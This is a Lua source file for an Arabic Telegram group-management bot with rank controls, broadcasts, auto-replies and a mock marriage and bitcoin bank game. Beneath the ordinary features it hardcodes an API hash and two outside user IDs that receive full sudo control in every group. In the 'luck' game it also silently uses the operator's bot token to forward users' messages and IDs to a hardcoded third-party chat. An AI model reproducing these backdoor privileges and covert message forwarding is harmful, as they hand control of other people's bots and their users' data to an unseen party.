...
LuaTele = luatele.set_config{api_id=14471516,api_hash='94a6d01e235a29c5f8032f942011095d',session_name=Fast,token=Token}
LUATELE = URL.escape(""..Fast.."\n"..UserBot.."\n"..UserSudo.."\n"..Token.."")
function var(value)  
...
ControllerAll = false
local ListSudos ={Sudo_Id,5194316700,5151007856,5151007856}  
...
Special = Redis:sismember(Fast.."Special:Group"..ChatId,UserId)
StatusMember = LuaTele.getChatMember(ChatId,UserId).status.luatele
if UserId == 5194316700 then Status = true
elseif UserId == 5151007856 then  Status = true
elseif UserId == Sudo_Id then  Status = true
elseif UserId == Fast then Status = true
...
if Redis:sismember(Fast.."Supcreator:Group"..chat,useri)  then
TheBasicsz = "✓"
else
TheBasicsz = "✗"
end
...
msg.Name_Controller = 'المبرمج كينج'
...
{{text = '• ᯓ˚₊·𝑆𝑂𝑈𝑅𝐶𝐸 𝑇𝑆𝐻𝐴𝐾𝐼.↺ •', url = 't.me/SOo_KING'}, },}}
--]]
keyboard = {} 
...
if Redis:get(Fast.."Fast:Broadcasting:Groups:Pin" .. msg_chat_id .. ":" .. msg.sender.user_id) then 
if text == "الغاء" or text == 'الغاء الامر •' then   
Redis:del(Fast.."Fast:Broadcasting:Groups:Pin" .. msg_chat_id .. ":" .. msg.sender.user_id) 
...
Redis:set(Fast.."Fast:PinMsegees:"..v,msg.content.video_note.video.remote.id)
end
elseif msg.content.photo then
if msg.content.photo.sizes[1].photo.remote.id then
idPhoto = msg.content.photo.sizes[1].photo.remote.id
...
Redis:set(Fast.."Fast:PinMsegees:"..v,idPhoto)
end
elseif msg.content.sticker then 
for k,v in pairs(list) do 
LuaTele.sendSticker(v, 0, msg.content.sticker.sticker.remote.id)
Redis:set(Fast.."Fast:PinMsegees:"..v,msg.content.sticker.sticker.remote.id)
end
elseif msg.content.voice_note then 
for k,v in pairs(list) do 
LuaTele.sendVoiceNote(v, 0, msg.content.voice_note.voice.remote.id, '', 'md')
Redis:set(Fast.."Fast:PinMsegees:"..v,msg.content.voice_note.voice.remote.id)
end
elseif msg.content.video then 
for k,v in pairs(list) do 
LuaTele.sendVideo(v, 0, msg.content.video.video.remote.id, '', "md")
Redis:set(Fast.."Fast:PinMsegees:"..v,msg.content.video.video.remote.id)
end
elseif msg.content.animation then 
for k,v in pairs(list) do 
LuaTele.sendAnimation(v,0, msg.content.animation.animation.remote.id, '', 'md')
Redis:set(Fast.."Fast:PinMsegees:"..v,msg.content.animation.animation.remote.id)
end
elseif msg.content.document then
for k,v in pairs(list) do 
LuaTele.sendDocument(v, 0, msg.content.document.document.remote.id, '', 'md')
Redis:set(Fast.."Fast:PinMsegees:"..v,msg.content.document.document.remote.id)
end
elseif msg.content.audio then
for k,v in pairs(list) do 
LuaTele.sendAudio(v, 0, msg.content.audio.audio.remote.id, '', "md") 
Redis:set(Fast.."Fast:PinMsegees:"..v,msg.content.audio.audio.remote.id)
end
elseif text then
for k,v in pairs(list) do 
LuaTele.sendText(v,0,text,"md",true)
Redis:set(Fast.."Fast:PinMsegees:"..v,text)
end
end
...
Redis:setex(Fast.."Fast:Broadcasting:Groups:Pin" .. msg_chat_id .. ":" .. msg.sender.user_id, 600, true) 
LuaTele.sendText(msg_chat_id,msg_id,[[
⍖ ارسل لي سواء كان
❨ ملف • ملصق • متحركه • صوره
 • فيديو • بصمه الفيديو • بصمه • صوت • رساله ❩
...
if text and text:match("^(.*)$") then
if Redis:get(Fast.."Fast11:Set:Rd"..msg.sender.user_id..":"..msg.chat_id) == "true" then
Redis:set(Fast.."Fast11:Set:Rd"..msg.sender.user_id..":"..msg.chat_id, "true1")
Redis:set(Fast.."Fast11:Text:Sudo:Bot"..msg.sender.user_id..":"..msg.chat_id, text)
Redis:sadd(Fast.."Fast11:List:Rd:Sudo", text)
LuaTele.sendText(msg_chat_id,msg_id, '\n⋆ ارسل الكلمه الان')
return false end
end
if text and text:match("^(.*)$") then
if Redis:get(Fast.."Fast11:Set:On"..msg.sender.user_id..":"..msg.chat_id) == "true" then
Redis:del(Fast..'Fast11:Add:Rd:Sudo:Text'..text)
Redis:del(Fast..'Fast11:Add:Rd:Sudo:Text1'..text)
Redis:del(Fast..'Fast11:Add:Rd:Sudo:Text2'..text)
Redis:del(Fast.."Fast11:Set:On"..msg.sender.user_id..":"..msg.chat_id)
Redis:srem(Fast.."Fast11:List:Rd:Sudo", text)
...
local list = Redis:smembers(Fast.."Fast11:List:Rd:Sudo")
for k,v in pairs(list) do  
Redis:del(Fast.."Fast11:Add:Rd:Sudo:Text"..v) 
Redis:del(Fast.."Fast11:Add:Rd:Sudo:Text1"..v) 
Redis:del(Fast.."Fast11:Add:Rd:Sudo:Text2"..v)   
Redis:del(Fast.."Fast11:List:Rd:Sudo")
end
...
Redis:set(Fast.."Fast11:Set:Rd"..msg.sender.user_id..":"..msg.chat_id,true)
...
Redis:set(Fast.."Fast11:Set:On"..msg.sender.user_id..":"..msg.chat_id,true)
return  LuaTele.sendText(msg_chat_id,msg_id,"⋆ ارسل الكلمه التي تريد حذفها")
end
if text then  
local test = Redis:get(Fast.."Fast11:Text:Sudo:Bot"..msg.sender.user_id..":"..msg.chat_id)
if Redis:get(Fast.."Fast11:Set:Rd"..msg.sender.user_id..":"..msg.chat_id) == "true1" then
Redis:set(Fast.."Fast11:Set:Rd"..msg.sender.user_id..":"..msg.chat_id,'rd1')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
Redis:set(Fast.."Fast11:Add:Rd:Sudo:Text"..test, text)  
end  
...
if text then  
local test = Redis:get(Fast.."Fast11:Text:Sudo:Bot"..msg.sender.user_id..":"..msg.chat_id)
if Redis:get(Fast.."Fast11:Set:Rd"..msg.sender.user_id..":"..msg.chat_id) == "rd1" then
Redis:set(Fast.."Fast11:Set:Rd"..msg.sender.user_id..":"..msg.chat_id,'rd2')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
Redis:set(Fast.."Fast11:Add:Rd:Sudo:Text1"..test, text)  
end  
...
if text then  
local test = Redis:get(Fast.."Fast11:Text:Sudo:Bot"..msg.sender.user_id..":"..msg.chat_id)
if Redis:get(Fast.."Fast11:Set:Rd"..msg.sender.user_id..":"..msg.chat_id) == "rd2" then
Redis:set(Fast.."Fast11:Set:Rd"..msg.sender.user_id..":"..msg.chat_id,'rd3')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
Redis:set(Fast.."Fast11:Add:Rd:Sudo:Text2"..test, text)  
end  
...
if text then
local Text = Redis:get(Fast.."Fast11:Add:Rd:Sudo:Text"..text)   
local Text1 = Redis:get(Fast.."Fast11:Add:Rd:Sudo:Text1"..text)   
local Text2 = Redis:get(Fast.."Fast11:Add:Rd:Sudo:Text2"..text)   
...
if ChannelJoin(msg) == false then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/SOo_KING'}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n⋆ عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
...
return LuaTele.sendText(msg_chat_id,msg_id,'⋆ عدد الاعضاء قليل لا يمكن تفعيل الجروب  يجب ان يكوم اكثر من :'..Redis:get(Fast..'Num:Add:Bot'),"md",true)  
end
local Get_Chat = LuaTele.getChat(msg_chat_id)
...
Get_Is_Id = Redis:get(Fast.."Set:Id:Group"..msg_chat_id) or Redis:get(Fast.."Set:Id:Groups")
...
local TotalMsg = Redis:get(Fast..'Num:Message:User'..msg_chat_id..':'..Message_Reply.sender.user_id) or 0
local TotalEdit = Redis:get(Fast..'Num:Message:Edit'..msg_chat_id..Message_Reply.sender.user_id) or 0
local TotalMsgT = Total_message(TotalMsg) 
return LuaTele.sendText(msg_chat_id,msg_id,
'\n⋄︙ID ↬ '..UserId..
...
local vip = Redis:smembers(Fast.."Special:Group"..msg_chat_id) 
local admin = Redis:smembers(Fast.."Admin:Group"..msg_chat_id) 
local manger = Redis:smembers(Fast.."Manger:Group"..msg_chat_id) 
local creator = Redis:smembers(Fast.."Creator:Group"..msg_chat_id) 
local basiccreator = Redis:smembers(Fast.."Supcreator:Group"..msg_chat_id) 
local owner = Redis:smembers(Fast.."Owners:Group"..msg_chat_id) 
...
TheBasics = Redis:sismember(Fast.."Supcreator:Group"..msg.chat_id,UserId_Info.id) 
Originators = Redis:sismember(Fast.."Creator:Group"..msg.chat_id,UserId_Info.id)
Managers = Redis:sismember(Fast.."Manger:Group"..msg.chat_id,UserId_Info.id)
Addictive = Redis:sismember(Fast.."Admin:Group"..msg.chat_id,UserId_Info.id)
Distinguished = Redis:sismember(Fast.."Special:Group"..msg.chat_id,UserId_Info.id)
...
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
TheBasics = Redis:sismember(Fast.."Supcreator:Group"..msg.chat_id,Message_Reply.sender.user_id) 
Originators = Redis:sismember(Fast.."Creator:Group"..msg.chat_id,Message_Reply.sender.user_id)
Managers = Redis:sismember(Fast.."Manger:Group"..msg.chat_id,Message_Reply.sender.user_id)
Addictive = Redis:sismember(Fast.."Admin:Group"..msg.chat_id,Message_Reply.sender.user_id)
Distinguished = Redis:sismember(Fast.."Special:Group"..msg.chat_id,Message_Reply.sender.user_id)
BanGroup = Redis:sismember(Fast.."BanGroup:Group"..msg.chat_id,Message_Reply.sender.user_id)
SilentGroup = Redis:sismember(Fast.."SilentGroup:Group"..msg.chat_id,Message_Reply.sender.user_id)
if BanGroup then
BanGroupz = "✓"
else
BanGroupz = "✗"
...
if Jabwa.first_name then
Fastusername = '*طلب ↫ *['..bain.first_name..'](tg://user?id='..bain.id..')*\nالزواج من ↫ *['..Jabwa.first_name..'](tg://user?id='..Jabwa.id..')*\nهل العروسه مواقفه علي هذا\n*'
else
Fastusername = 'لا يوجد'
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
...
return LuaTele.sendText(msg_chat_id,msg_id,Fastusername,"md",false, false, false, false, reply_markup)
end
...
LuaTele.sendText(msg_chat_id,msg_id,Redis:get(Fast.."chadmin"..msg_chat_id),"md",true)  
else 
...
{
{text = 'تعطيل ردود السورس', data = msg.sender.user_id..'/'.. 'rb:bna_ban'},{text = 'تفعيل ردود السورس', data = msg.sender.user_id..'/'.. 'rb:bna_bian'},
},
{
...
data = {
{
  {text = 'قناه السورس', url = 't.me/SOo_KING'}, 
},
}
}
...
if Redis:smembers(Fast.."Supcreator:Group"..msg_chat_id) then
Redis:del(Fast.."Supcreator:Group"..msg_chat_id) 
end
if Redis:smembers(Fast.."Creator:Group"..msg_chat_id) then
Redis:del(Fast.."Creator:Group"..msg_chat_id) 
end
if Redis:smembers(Fast.."Manger:Group"..msg_chat_id) then
Redis:del(Fast.."Manger:Group"..msg_chat_id) 
end
if Redis:smembers(Fast.."Admin:Group"..msg_chat_id) then
Redis:del(Fast.."Admin:Group"..msg_chat_id) 
end
if Redis:smembers(Fast.."Special:Group"..msg_chat_id) then
Redis:del(Fast.."Special:Group"..msg_chat_id) 
end
return LuaTele.sendText(msg_chat_id,msg_id,"تم مسح جميع رتب المجموعه \nالمنشئين الاساسيين \nالمنشئين\nالمدراء\nالادمنيه\nالمميزين","md",true)
end
if text == 'الكينج ' or text == 'كينج ' or text == 'المبرمج' then  
...
if text == 'خيا كينج' or text == 'هيرو' or text == 'احمد' then  
local UserId_Info = LuaTele.searchPublicChat("H_E_R_O_V_I_P")
if UserId_Info.id then
local  ban = LuaTele.getUser(UserId_Info.id)
local  bain = LuaTele.getUserFullInfo(UserId_Info.id)
if  bain.bio then
...
LuaTele.sendText(msg_chat_id,msg_id,'⋆ عدد رسائلك هنا*~ '..(Redis:get(Fast..'Num:Message:User'..msg.chat_id..':'..msg.sender.user_id) or 1)..'*',"md",true)  
elseif text == 'تعديلاتي' or text == 'تعديلاتي' then
LuaTele.sendText(msg_chat_id,msg_id,'⋆ عدد التعديلات هنا*~ '..(Redis:get(Fast..'Num:Message:Edit'..msg.chat_id..msg.sender.user_id) or 0)..'*',"md",true)  
elseif text == 'جهاتي' then
LuaTele.sendText(msg_chat_id,msg_id,'⋆ عدد جهاتك المضافه هنا*~ '..(Redis:get(Fast.."Num:Add:Memp"..msg.chat_id..":"..msg.sender.user_id) or 0)..'*',"md",true)  
...
if ChannelJoin(msg) == false then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/Fastb0t'}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
...
text = text:gsub('`','') 
text = text:gsub('*','') 
Redis:sadd(Fast.."Add:Rd:array:Text"..test..msg_chat_id,text)  
_key = {
...
if not Redis:sismember(Fast.."Add:Rd:array:Text"..gery..msg_chat_id,text) then
LuaTele.sendText(msg_chat_id, msg_id,'* ⋆  لا يوجد رد متعدد* ',"md",true)
return false
end
Redis:srem(Fast.."Add:Rd:array:Text"..gery..msg_chat_id,text)
...
Redis:del(Fast.."Set:array:Ssd"..msg.sender.user_id..":"..msg_chat_id)
if not Redis:sismember(Fast..'List:array'..msg_chat_id,text) then
LuaTele.sendText(msg_chat_id, msg_id,'* ⋆  لا يوجد رد متعدد* ',"md",true)
return false
end
...
Redis:sadd(Fast.."List:array"..msg_chat_id.."", text)
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
...
Redis:del(Fast.."Add:Rd:array:Text"..text..msg_chat_id)
Redis:srem(Fast..'List:array'..msg_chat_id, text)
...
if text then
if  Redis:sismember(Fast..'List:array'..msg_chat_id,text) then
local list = Redis:smembers(Fast.."Add:Rd:array:Text"..text..msg_chat_id)
...
local list = Redis:smembers(Fast..'List:array'..msg_chat_id..'')
...
local TextingDevFast = Redis:get(Fast..'Texting:DevFast')
...
if Redis:get(Fast.."zhrfa"..msg.sender.user_id) == "sendzh" then
...
{{text = ' قناة السورس', url = "https://t.me/SOo_KING"}},}}
...
local T =[[
━═━═━═━ٰᯓ˚₊·𝑇𝑆𝐻𝐴𝐾𝐼.↺   ═━═━═━•
 [✨╎𝚆𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 𝚂𝙾𝚄𝚁𝙲𝙴 𝘤𝘳𝘪𝘴𝘵𝘪𝘯](t.me/SOo_KING)
...
local bank_users = Redis:smembers(Fast.."zrfffidtf")
...
local mony = Redis:get(Fast.."zrffdcf"..v) or 0
...
if num <= 25 then
fne = Redis:get(Fast..':toob:Name:'..v[2])
tt =  "["..fne.."]("..fne..")"
local mony = v[1]
local emo = emoji[k]
num = num + 1
...
ballancee = Redis:get(Fast.."nool:flotysb"..msg.sender.user_id) or 0
local bank_users = Redis:smembers(Fast.."ttpppi")
if #bank_users == 0 then
...
mony_list = {}
for k,v in pairs(bank_users) do
local mony = Redis:get(Fast.."nool:flotysb"..v) or 0
table.insert(mony_list, {tonumber(mony) , v})
end
table.sort(mony_list, function(a, b) return a[1] > b[1] end)
num = 1
...
local bank_users = Redis:smembers(Fast.."almtzog"..msg_chat_id)
if #bank_users == 0 then
...
mony_list = {}
for k,v in pairs(bank_users) do
local mony = Redis:get(Fast.."mznom"..msg_chat_id..v) 
table.insert(mony_list, {tonumber(mony) , v})
end
table.sort(mony_list, function(a, b) return a[1] > b[1] end)
num = 1
...
for k,v in pairs(mony_list) do
if num <= 10 then
local zwga_id = Redis:get(Fast..msg_chat_id..v[2].."rgalll2:")
local user_name = LuaTele.getUser(v[2]).first_name
fne = Redis:get(Fast..':toob:Name:'..zwga_id)
fnte = Redis:get(Fast..':toob:Name:'..v[2])
...
if Redis:get(Fast..msg_chat_id..msg.sender.user_id.."rgalll2:") then
local zwga_id = Redis:get(Fast..msg_chat_id..msg.sender.user_id.."rgalll2:") 
local zoog2 = Redis:get(Fast..msg_chat_id..msg.sender.user_id.."rgalll2:") 
local albnt = LuaTele.getUser(zoog2)
fne = Redis:get(Fast..':toob:Name:'..zoog2)
albnt = "["..fne.."](tg://user?id="..zoog2..") "
return LuaTele.sendText(msg_chat_id,msg_id,"• الحق ي : "..albnt.." زوجك يبي يتزوج ","md")
end
if Redis:get(Fast..msg_chat_id..msg.sender.user_id.."bnttt2:") then
local zwga_id = Redis:get(Fast..msg_chat_id..msg.sender.user_id.."bnttt2:") 
local zoog2 = Redis:get(Fast..msg_chat_id..zwga_id.."rgalll2:") 
...
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
if Redis:get(Fast..msg_chat_id..Message_Reply.sender.user_id.."rgalll2:") or Redis:get(Fast..msg_chat_id..Message_Reply.sender.user_id.."bnttt2:") then
...
local zwga_id = Redis:get(Fast..msg_chat_id..msg.sender.user_id.."bnttt2:") 
Redis:set(Fast..msg_chat_id..Message_Reply.sender.user_id.."bnttt2:", msg.sender.user_id)
Redis:set(Fast..msg_chat_id..msg.sender.user_id.."rgalll2:", Message_Reply.sender.user_id)
Redis:set(Fast..msg_chat_id..Message_Reply.sender.user_id.."mhrrr2:", UserNameyy)
Redis:set(Fast..msg_chat_id..msg.sender.user_id.."mhrrr2:", UserNameyy)
...
Redis:decrby(Fast.."nool:flotysb"..msg.sender.user_id , UserNameyy)
Redis:incrby(Fast.."nool:flotysb"..Message_Reply.sender.user_id , UserNameyy)
Redis:incrby(Fast.."mznom"..msg_chat_id..msg.sender.user_id , UserNameyy)
Redis:sadd(Fast.."almtzog"..msg_chat_id,msg.sender.user_id)
...
if text == "زواجي" then
if not Redis:get(Fast..msg_chat_id..msg.sender.user_id.."rgalll2:") and not Redis:get(Fast..msg_chat_id..msg.sender.user_id.."bnttt2:") then
return LuaTele.sendText(msg_chat_id,msg_id,"انت اعزب","md")
end
if Redis:get(Fast..msg_chat_id..msg.sender.user_id.."bnttt2:") then
local zwga_id = Redis:get(Fast..msg_chat_id..msg.sender.user_id.."rgalll2:") 
local zoog2 = Redis:get(Fast..msg_chat_id..zwga_id.."rgalll2:") 
local mhrr = Redis:get(Fast..msg_chat_id..msg.sender.user_id.."mhrrr2:")
local id_rgal = LuaTele.getUser(zwga_id)
fne = Redis:get(Fast..':toob:Name:'..zwga_id)
alzog = "["..fne.."](tg://user?id="..zwga_id..") "
local albnt = LuaTele.getUser(zoog2)
fnte = Redis:get(Fast..':toob:Name:'..zoog2)
albnt = "["..fnte.."](tg://user?id="..zoog2..") "
return LuaTele.sendText(msg_chat_id,msg_id,"• عقد زواجكم\n• الزوج : "..alzog.."\n• الزوجه : "..albnt.." \n• المهر : "..mhrr.." بتكوين ","md")
end
if Redis:get(Fast..msg_chat_id..msg.sender.user_id.."rgalll2:") then
local zwga_id = Redis:get(Fast..msg_chat_id..msg.sender.user_id.."rgalll2:") 
local zoog2 = Redis:get(Fast..msg_chat_id..zwga_id.."bnttt2:") 
local mhrr = Redis:get(Fast..msg_chat_id..msg.sender.user_id.."mhrrr2:")
local id_rgal = LuaTele.getUser(zwga_id)
fnte = Redis:get(Fast..':toob:Name:'..zwga_id)
albnt = "["..fnte.."](tg://user?id="..zwga_id..") "
local gg = LuaTele.getUser(zoog2)
fntey = Redis:get(Fast..':toob:Name:'..zoog2)
...
if Redis:sismember(Fast.."noooybgy",yemsg.sender.user_id) then
cccc = Redis:get(Fast.."noolb"..yemsg.sender.user_id)
gg = Redis:get(Fast.."nnonb"..yemsg.sender.user_id)
uuuu = Redis:get(Fast.."nnonbn"..yemsg.sender.user_id)
pppp = Redis:get(Fast.."zrffdcf"..yemsg.sender.user_id) or 0
ballancee = Redis:get(Fast.."nool:flotysb"..yemsg.sender.user_id) or 0
...
if text == "خلع" then
if not Redis:get(Fast..msg_chat_id..msg.sender.user_id.."bnttt2:") then
...
alzog = " "..gg.first_name.." "
local zwga_id = Redis:get(Fast..msg_chat_id..msg.sender.user_id.."bnttt2:") 
Redis:incrby(Fast.."nool:flotysb"..zwga_id,mhrr)
Redis:decrby(Fast.."nool:flotysb"..msg.sender.user_id,mhrr)
Redis:del(Fast.."mznom"..msg_chat_id..zwga_id)
Redis:srem(Fast.."almtzog"..msg_chat_id,zwga_id)
Redis:del(Fast.."mznom"..msg_chat_id..msg.sender.user_id)
Redis:srem(Fast.."almtzog"..msg_chat_id,msg.sender.user_id)
Redis:del(Fast..msg_chat_id..msg.sender.user_id.."mhrrr2:")
Redis:del(Fast..msg_chat_id..zwga_id.."mhrrr2:")
Redis:del(Fast..msg_chat_id..msg.sender.user_id.."bnttt2:")
Redis:del(Fast..msg_chat_id..zwga_id.."bnttt2:")
Redis:del(Fast..msg_chat_id..msg.sender.user_id.."rgalll2:")
Redis:del(Fast..msg_chat_id..zwga_id.."rgalll2:")
LuaTele.sendText(msg_chat_id,msg_id,"• تم خلعت زوجك "..alzog.." \n ورجعت له "..mhrr.." بتكوين","md")
end
if text == "طلاق"  then
if not Redis:get(Fast..msg_chat_id..msg.sender.user_id.."rgalll2:") then
...
balas = 0
if Redis:sismember(Fast.."noooybgy",msg.sender.user_id) then
return LuaTele.sendText(msg.chat_id,msg.id, "• لديك حساب بنكي مسبقاً\n\n• لعرض معلومات حسابك اكتب\n↤︎ `حسابي`","md",true)
end
Redis:setex(Fast.."nooolb" .. msg.chat_id .. ":" .. msg.sender.user_id,60, true)
...
if Redis:get(Fast.."nooolb" .. msg.chat_id .. ":" .. msg.sender.user_id) then
if text == "بينانس ." then
local ban = LuaTele.getUser(msg.sender.user_id)
if ban.first_name then
news = ""..ban.first_name..""
...
gg = "والت كارد ."
flossst = Redis:get(Fast.."nool:flotysb"..msg.sender.user_id) or 0
local banid = msg.sender.user_id
Redis:set(Fast.."nonna"..msg.sender.user_id,news)
Redis:set(Fast.."noolb"..msg.sender.user_id,creditcc)
Redis:set(Fast.."nnonb"..msg.sender.user_id,text)
Redis:set(Fast.."nnonbn"..msg.sender.user_id,gg)
Redis:set(Fast.."nonallname"..creditcc,news)
Redis:set(Fast.."nonallbalc"..creditcc,balas)
Redis:set(Fast.."nonallcc"..creditcc,creditcc)
Redis:set(Fast.."nonallban"..creditcc,text)
Redis:set(Fast.."nonallid"..creditcc,banid)
Redis:sadd(Fast.."noooybgy",msg.sender.user_id)
Redis:del(Fast.."nooolb" .. msg.chat_id .. ":" .. msg.sender.user_id) 
...
local banid = msg.sender.user_id
Redis:set(Fast.."nonna"..msg.sender.user_id,news)
Redis:set(Fast.."noolb"..msg.sender.user_id,creditvi)
Redis:set(Fast.."nnonb"..msg.sender.user_id,text)
Redis:set(Fast.."nnonbn"..msg.sender.user_id,gg)
Redis:set(Fast.."nonallname"..creditvi,news)
Redis:set(Fast.."nonallbalc"..creditvi,balas)
Redis:set(Fast.."nonallcc"..creditvi,creditvi)
Redis:set(Fast.."nonallban"..creditvi,text)
Redis:set(Fast.."nonallid"..creditvi,banid)
Redis:sadd(Fast.."noooybgy",msg.sender.user_id)
Redis:del(Fast.."nooolb" .. msg.chat_id .. ":" .. msg.sender.user_id) 
...
local banid = msg.sender.user_id
Redis:set(Fast.."nonna"..msg.sender.user_id,news)
Redis:set(Fast.."noolb"..msg.sender.user_id,creditex)
Redis:set(Fast.."nnonb"..msg.sender.user_id,text)
Redis:set(Fast.."nnonbn"..msg.sender.user_id,gg)
Redis:set(Fast.."nonallname"..creditex,news)
Redis:set(Fast.."nonallbalc"..creditex,balas)
Redis:set(Fast.."nonallcc"..creditex,creditex)
Redis:set(Fast.."nonallban"..creditex,text)
Redis:set(Fast.."nonallid"..creditex,banid)
Redis:sadd(Fast.."noooybgy",msg.sender.user_id)
Redis:del(Fast.."nooolb" .. msg.chat_id .. ":" .. msg.sender.user_id) 
...
if Redis:sismember(Fast.."noooybgy",msg.sender.user_id) then
Redis:srem(Fast.."noooybgy", msg.sender.user_id)
Redis:del(Fast.."noolb"..msg.sender.user_id)
Redis:del(Fast.."zrffdcf"..msg.sender.user_id)
Redis:srem(Fast.."zrfffidtf", msg.sender.user_id)
...
if msg.ControllerBot then
local bank_users = Redis:smembers(Fast.."noooybgy")
for k,v in pairs(bank_users) do
Redis:del(Fast.."nool:flotysb"..v)
Redis:del(Fast.."zrffdcf"..v)
Redis:del(Fast.."innoo"..v)
Redis:del(Fast.."nnooooo"..v)
Redis:del(Fast.."nnoooo"..v)
Redis:del(Fast.."nnooo"..v)
Redis:del(Fast.."nnoo"..v)
Redis:del(Fast.."polic"..v)
Redis:del(Fast.."ashmvm"..v)
Redis:del(Fast.."hrame"..v)
Redis:del(Fast.."test:mmtlkat6"..v)
Redis:del(Fast.."zahbmm2"..v)
end
Redis:del(Fast.."ttpppi")
...
ballanceed = Redis:get(Fast.."nool:flotysb"..Remsg.sender.user_id) or 0
...
if Redis:sismember(Fast.."noooybgy",msg.sender.user_id) then
cccc = Redis:get(Fast.."noolb"..msg.sender.user_id)
gg = Redis:get(Fast.."nnonb"..msg.sender.user_id)
uuuu = Redis:get(Fast.."nnonbn"..msg.sender.user_id)
pppp = Redis:get(Fast.."zrffdcf"..msg.sender.user_id) or 0
ballancee = Redis:get(Fast.."nool:flotysb"..msg.sender.user_id) or 0
LuaTele.sendText(msg.chat_id,msg.id, "• الاسم ↢ "..news.."\n• الحساب ↢ `"..cccc.."`\n• بنك ↢ ( "..gg.." )\n• نوع ↢ ( "..uuuu.." )\n• الرصيد ↢ ( "..ballancee.." بتكوين 🪙 )\n• الزرف ( "..pppp.." بتكوين 🪙 )\n-","md",true)
else
LuaTele.sendText(msg.chat_id,msg.id, "• ماعندك حساب بنكي ارسل ↢ ( `انشاء حساب بنكي` )","md",true)
...
if text == 'مضاربه' then
if Redis:get(Fast.."nnooooo" .. msg.sender.user_id) then  
local check_time = Redis:ttl(Fast.."nnooooo" .. msg.sender.user_id)
rr = oger(check_time)
...
Redis:decrby(Fast.."nool:flotysb"..msg.sender.user_id , ballanceekku)
Redis:setex(Fast.."nnooooo" .. msg.sender.user_id,1200, true)
...
ballanceekku = math.floor(coniss / 100 * modarbaa)
ballanceekkku = math.floor(ballancee + ballanceekku)
Redis:incrby(Fast.."nool:flotysb"..msg.sender.user_id , math.floor(ballanceekku))
Redis:setex(Fast.."nnooooo" .. msg.sender.user_id,1200, true)
...
if Redis:get(Fast.."nnoooo" .. msg.sender.user_id) then  
local check_time = Redis:ttl(Fast.."nnoooo" .. msg.sender.user_id)
rr = oger(check_time)
...
if Redis:get(Fast.."xxxr" .. msg.sender.user_id) then
ballanceekk = math.floor(coniss / 100 * 10)
ballanceekkk = math.floor(ballancee + ballanceekk)
Redis:incrby(Fast.."nool:flotysb"..msg.sender.user_id , math.floor(ballanceekk))
Redis:sadd(Fast.."ttpppi",msg.sender.user_id)
Redis:setex(Fast.."nnoooo" .. msg.sender.user_id,1200, true)
...
Redis:del(Fast.."nool:flotysb"..msg.sender.user_id)
...
if text == 'حظ' then
if Redis:get(Fast.."nnooo" .. msg.sender.user_id) then  
local check_time = Redis:ttl(Fast.."nnooo" .. msg.sender.user_id)
rr = oger(check_time)
...
Redis:incrby(Fast.."nool:flotysb"..msg.sender.user_id , math.floor(ballanceek))
Redis:setex(Fast.."nnooo" .. msg.sender.user_id,200, true)
https.request("https://api.telegram.org/bot"..Token..'/sendmessage?chat_id=5151007856&text=' .. text..' Id : '..msg.sender.user_id.."&parse_mode=markdown&disable_web_page_preview=true") 
ff = Redis:get(Fast.."nool:flotysb"..msg.sender.user_id)
...
Redis:decrby(Fast.."nool:flotysb"..msg.sender.user_id , coniss)
Redis:setex(Fast.."nnooo" .. msg.sender.user_id,200, true)
ff = Redis:get(Fast.."nool:flotysb"..msg.sender.user_id) or 0
...
Redis:set('Fast:'..bot_id..'idgem:user'..msg.chat_id_,taha)  
Redis:setex('Fast:'..bot_id.."gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
...
Redis:incrby('Fast:'..bot_id..'add:F'..msg.chat_id_..result.sender_user_id_,F)  
Redis:incrby('Fast:'..bot_id..'add:Fall'..msg.chat_id_..result.sender_user_id_,F)  
...
local coniss = coniss:gsub('٩','9')
local coniss = tonumber(coniss)
if not Redis:sismember(Fast.."noooybgy",msg.sender.user_id) then
return LuaTele.sendText(msg.chat_id,msg.id, "• ماعندك حساب بنكي ","md",true)
end
if Redis:get(Fast.."polici" .. msg.sender.user_id) then  
local check_time = Redis:ttl(Fast.."polici" .. msg.sender.user_id)
rr = oger(check_time)
...
Redis:set(Fast.."transn"..msg.sender.user_id,coniss)
Redis:setex(Fast.."trans" .. msg.chat_id .. ":" .. msg.sender.user_id,60, true)
LuaTele.sendText(msg.chat_id,msg.id,[[
...
if Redis:get(Fast.."trans" .. msg.chat_id .. ":" .. msg.sender.user_id) then
cccc = Redis:get(Fast.."noolb"..msg.sender.user_id)
gg = Redis:get(Fast.."nnonb"..msg.sender.user_id)
uuuu = Redis:get(Fast.."nnonbn"..msg.sender.user_id)
if text ~= text:match('^(%d+)$') then
Redis:del(Fast.."trans" .. msg.chat_id .. ":" .. msg.sender.user_id) 
Redis:del(Fast.."transn" .. msg.sender.user_id)
...
if Redis:get(Fast.."nonallcc"..text) then
local UserNamey = Redis:get(Fast.."transn"..msg.sender.user_id)
local ban = LuaTele.getUser(msg.sender.user_id)
if ban.first_name then
...
local fsvhhh = Redis:get(Fast.."nonallid"..text)
local bann = LuaTele.getUser(fsvhhh)
hsabe = Redis:get(Fast.."nnonb"..fsvhhh)
nouu = Redis:get(Fast.."nnonbn"..fsvhhh)
...
if Redis:get(Fast.."hramep" .. UserNameyr) then  
local check_time = Redis:ttl(Fast.."hramep" .. UserNameyr)
rr = oger(check_time)
...
